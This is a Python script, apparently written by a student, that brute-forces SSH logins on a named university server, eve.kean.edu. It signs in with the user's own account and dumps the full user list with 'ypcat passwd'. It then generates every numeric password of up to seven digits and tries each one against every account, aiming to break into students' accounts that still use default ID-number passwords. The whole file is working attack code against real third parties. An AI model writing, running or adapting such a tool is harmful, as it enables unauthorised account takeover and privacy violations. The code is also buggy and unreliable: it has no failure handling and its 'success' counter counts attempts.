#A program to attempt to log into peoples kean eve server accounts if they haven't changed them from the
#school issued student ID
#intertools used for making combinations using the product function
import itertools 
#time to be used for my basic code cracker and potentailly password breaking analysis
import time
#diffrent attemots to ssh
import sys
#diffrent attempts to ssh
import select
#library to accomplish ssh
import paramiko
#diffrent attempt to ssh
import subprocess
print('You must have kean eve server access to use this program')
print('Use your log in to gather the information for th ecode to execute')

#the server we are trying to reach
hostname1 = 'eve.kean.edu'

#a list of passwords enerated
passwordList = []

#A user needs to log in to generate user list
username1= input('what is your username?')

#A user needs to log in to generate user list
password1=input("What is the password ")

#will be used if a passowrd is succsefully accessed
sucsesses = 0

#a list to store my usernames 
users = [] 

#logging into the eve server the first time. Runs a command the exits the session
ssh_client=paramiko.SSHClient()
ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
ssh_client.connect(hostname=hostname1,username=username1,password=password1)

#a command line in linux to access all usernames of people on the 
stdin, stdout, stderr = ssh_client.exec_command("ypcat passwd | awk -F: '{print $1}'")

#used to count users on the server
users_on = 0

#all users on eve are save to a list called users 
for line in stdout.read().splitlines():
    users.append(line)
    

#ends the intial session loggin
ssh_client.close()

for i in users:
    users_on = users_on +1
print('\n\n')
print('There are ' ,users_on ,'users on the system')

userCount=0

##checking my list value
#print(users[5])

##checking what the actaul string length is, my command saved each value as b 'str' for each value
#print(users[5] ,"the string length is " , len(users[5]))

    
#I am only trying to break access users who havent changed there password so excluding and specail charaters
#and letter

possibilities = ("1234567890")

##a password breaker created in early stages to test if i can break a numeric password. used pieces of it for
##finished prodeuct. 
#Password = input("What is your password?\n")

#A way to track the time (may be used as a condition to run the program for only a certain amount of time)
start = time.time()

#to see if the usere shortened their password even more for faster log in ie 1 or 1234
CharLength = 1

#this will only do passwords up to 8 digits which I can increment or decremnt or even add user prompt for length attempted. 
#length will effect possible combinations and utimitly time as well. 
for CharLength in range(8):

    #This finds all of the possible combinations of characters that are of the correct length.
    passwords = (itertools.product(possibilities, repeat = CharLength))

    #This prints three blank lines.
    #print("\n \n")

    #This is the way to print the products of generators.
    for i in passwords:

        #This increases the number of combinations tried by one to show that one more has been tried.
        
        
        #As the itertools.products() returns a tuple, we have to change this into a sting for the list.
        i = str(i)

        #The parts that were added as a result of conversion from tuple have to be removed.
        i = i.replace("[", "")
        i = i.replace("]", "")
        i = i.replace("'", "")
        i = i.replace(" ", "")
        i = i.replace(",", "")
        i = i.replace("(", "")
        i = i.replace(")", "")


        passwordList.append(i)

         #The original code of just a code breaking program expaned from here. 
        '''#This checks if the password created by the user was correct.
        if i == Password:
            #This takes the time at which the program finished.
            end = time.time()
            #This works out the time it took to find the password.
            timetaken = end - start
            #This tells the user how long it took to find the password as well as how many attempts it took.
            print("Found it in ", timetaken, " seconds ")
            
            
            #This prints the password to confirm for the user that the program was sucessful.
            print(i)
            #This stops the program from exiting until the user presses enter.
            input("Press enter when you have finished")
            #This exits the program
            exit()
'''
##print(passwordList)

# attempting to run my brute force loop I have  alist of passwords and a list of users. 
#for each user try all the passwords
#working a solution to failed login attempts

while sucsesses < 15:
    for q in users:
        for z in passwordList:
            
            ssh_client=paramiko.SSHClient()
            
            ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            ssh_client.connect(hostname=hostname1,username=q,password=z)
            
            stdin, stdout, stderr = ssh_client.exec_command("ls -l")
            
            sucsesses = sucsesses +1
            print('attemting')
            
            ssh_client.close()
